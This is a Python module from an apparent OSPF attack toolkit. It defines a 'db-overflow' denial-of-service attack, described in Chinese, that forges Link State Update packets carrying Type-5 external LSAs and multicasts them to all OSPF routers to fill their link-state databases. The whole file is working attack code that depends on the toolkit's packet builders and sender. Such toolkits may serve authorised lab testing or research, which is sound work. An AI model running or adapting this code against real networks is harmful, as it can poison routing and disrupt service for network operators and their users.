import ipaddress
from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import DoSConfig
from ospf_attack.core.packet import build_lsu_packet, build_lsa_header, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender


class DBOverflowAttack(BaseAttack):
    name = "db-overflow"
    description = "注入大量外部 LSA (Type-5) 填满 LSDB"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)
        base_net = 0x0A000000
        count = min(self.config.lsa_count, 100)
        for i in range(count):
            lsid = str(ipaddress.IPv4Address(base_net + (i << 8)))
            lsa = build_lsa_header(
                lsa_type=5, link_state_id=lsid,
                advertising_router=self.config.router_id, sequence=0x80000001, age=0,
            )
            pkt = build_lsu_packet(
                router_id=self.config.router_id, area_id=self.config.area_id,
                src_ip=src_ip, dst_ip=OSPF_MULTICAST_ALL, lsa_count=1,
            )
            pkt = pkt / lsa
            self._sender.send_raw(pkt)
        return AttackResult(success=True, packets_sent=self._sender.sent_count,
                           target_affected=False, details=f"DB 溢出: {count} Type-5 LSAs")

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
